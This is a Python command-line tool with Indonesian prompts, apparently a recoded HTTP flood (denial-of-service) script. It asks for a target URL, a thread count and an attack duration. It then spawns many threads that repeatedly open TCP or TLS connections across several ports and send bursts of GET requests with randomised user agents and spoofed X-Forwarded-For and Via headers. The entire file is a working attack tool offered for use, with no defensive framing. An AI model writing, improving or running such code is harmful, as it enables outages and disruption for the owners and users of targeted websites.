import os, rich
import subprocess
import sys
import threading
import socket
import ssl
import random
import time
import datetime
from urllib.parse import urlparse
from sys import stdout
from rich.console import Console
from rich.panel import Panel
from colorama import init
from rich.panel import Panel

M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE

try:
    file_color = open("data/theme_color", "r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00FF00]"
    W1 = random.choice([M2, H2, K2])
    W2 = random.choice([K2, M2, K2])
    W3 = random.choice([H2, K2, M2])
    color_panel = "#00FF00"
    color_ok = "#00FF00"
    color_cp = "#FFFF00"

try:
    color_table = open("data/theme_color", "r").read()
except FileNotFoundError:
    color_table = "#00FF00"

def logofan():
    Console().print(
        Panel(
            f"""
[bold red]███████████████████████ [bold yellow]NOTE  : [bold green]RECODE BY FANKY  
[bold red]███████████████████████ [bold yellow]Githb : [bold green]github.com/fanky86  
[bold red]███████████████████████ [bold yellow]Serah : [bold green]BTW GW GANTENG
[bold white]███████████████████████          
[bold white]███████████████████████          
[bold white]███████████████████████ 
[bold white]""",
            width=60,
            style=f"{color_panel}",
        )
    )

required_modules = [
    "requests",
    "colorama",
    "rich",
    "bs4"
]

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_modules():
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            print(f"Modul '{module}' tidak ditemukan. Menginstal...")
            install(module)

check_and_install_modules()

console = Console()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_user_agents():
    try:
        with open('ua.txt', 'r') as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        console.print(Panel(f"{M2}File ua.txt tidak ditemukan. Pastikan file tersebut ada di direktori yang sama.", style="bold red"))
        sys.exit(1)

def command():
    try:
        target = console.input(f'{H2}• {K2}Masukkan URL Target: {H2}')
        thread = int(console.input(f'{H2}• {K2}Jumlah Thread: {H2}'))
        t = int(console.input(f'{H2}• {K2}Durasi Serangan (detik): {H2}'))

        if not target or thread <= 0 or t <= 0:
            console.print(Panel(f"{M2}Input tidak valid, coba lagi.", style="bold red"))
            return

        attack_panel = Panel(f"[bold cyan]Target: {target}[/bold cyan]\n"
                             f"[bold yellow]Jumlah Thread: {thread}[/bold yellow]\n"
                             f"[bold magenta]Durasi: {t} detik[/bold magenta]",
                             title="[bold green]Detail Serangan[/bold green]",
                             border_style="green")
        console.print(attack_panel)

        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        countdown_thread = threading.Thread(target=countdown, args=(t,))
        countdown_thread.start()
        countdown_thread.join()

        console.print(Panel("[bold cyan]Menunggu 5 detik sebelum siap untuk serangan selanjutnya...[/bold cyan]", style="cyan"))
        time.sleep(5)

    except ValueError:
        console.print(Panel(f"{M2}Input angka tidak valid.", style="bold red"))

def attackSTELLAR(url, timer, threads):
    for _ in range(threads * 2):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    try:
        end_time = time.time() + timer
        user_agents = load_user_agents()
        paths = ["/", "/index.html", "/home", "/news", "/contact", f"/rand{random.randint(100,999)}"]

        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(3)

                host = urlparse(url).netloc
                if not host:
                    host = url  # fallback jika user input bukan URL utuh

                port_list = [443, 80, 8080, 8000, 8888]
                connected = False

                for port in port_list:
                    try:
                        s.connect((host, port))
                        if port == 443:
                            ctx = ssl.create_default_context()
                            s = ctx.wrap_socket(s, server_hostname=host)
                        connected = True
                        console.print(f"{H2}[+] Terhubung ke {host}:{port}", style="green")
                        break
                    except:
                        continue

                if not connected:
                    console.print(f"{M2}[-] Gagal konek ke {host}", style="red")
                    s.close()
                    time.sleep(0.5)
                    continue

                xff_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                path = random.choice(paths)
                req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(user_agents)}\r\n"
                    f"X-Forwarded-For: {xff_ip}\r\n"
                    f"Via: 1.1 {xff_ip}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: Keep-Alive\r\n\r\n"
                )
                try:
                    s.send(req.encode())
                    for _ in range(100):
                        s.send(req.encode())
                except:
                    pass
                s.close()
                time.sleep(0.1)

            except Exception as e:
                console.print(Panel(f"{M2}Kesalahan koneksi: {e}", style="bold red"))
                time.sleep(1)
    except Exception as fatal_error:
        console.print(Panel(f"{M2}Thread mati karena error fatal: {fatal_error}", style="bold red"))

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=t)
    while True:
        remaining_time = (until - datetime.datetime.now()).total_seconds()
        if remaining_time > 0:
            stdout.flush()
            console.print(f"Status serangan => {remaining_time:.2f} detik tersisa", end="\r")
        else:
            stdout.flush()
            console.print(Panel("[bold green]Serangan selesai![/bold green]", style="green"))
            return

if __name__ == '__main__':
    init(convert=True)
    clear()
    logofan()
    while True:
        command()
